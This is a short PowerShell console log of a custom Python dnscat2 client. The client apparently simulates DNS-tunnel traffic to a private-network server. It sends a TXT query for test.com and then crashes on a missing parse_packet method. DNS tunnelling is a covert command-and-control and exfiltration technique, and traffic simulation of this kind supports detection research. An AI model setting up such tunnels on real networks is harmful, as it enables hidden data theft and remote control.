(venv) PS C:\Users\User\user_behavior_generation\worker\venv\Scripts> .\python.exe C:\Users\User\user_behavior_generation\worker\dnscat_client.py --domain test.com --dns 192.168.122.47

--- AVVIO CLIENT DNSCAT2 (Simulazione Traffico) ---
[*] Dominio: test.com
[*] Server: 192.168.122.47
[*] Modalità: Plaintext (Assicurati che il server abbia --security=open)
[*] Invio SYN...
[*] Invio Query TXT a 192.168.122.47: AE050043E6e7190000.test.com...
[+] Risposta Raw: cac90043e661510000
Traceback (most recent call last):
  File "C:\Users\User\user_behavior_generation\worker\dnscat_client.py", line 168, in <module>
    client.start_session()
    ~~~~~~~~~~~~~~~~~~~~^^
  File "C:\Users\User\user_behavior_generation\worker\dnscat_client.py", line 144, in start_session
    msg = self.parse_packet(response)
          ^^^^^^^^^^^^^^^^^
AttributeError: 'Dnscat2Client' object has no attribute 'parse_packet'
(venv) PS C:\Users\User\user_behavior_generation\worker\venv\Scripts>
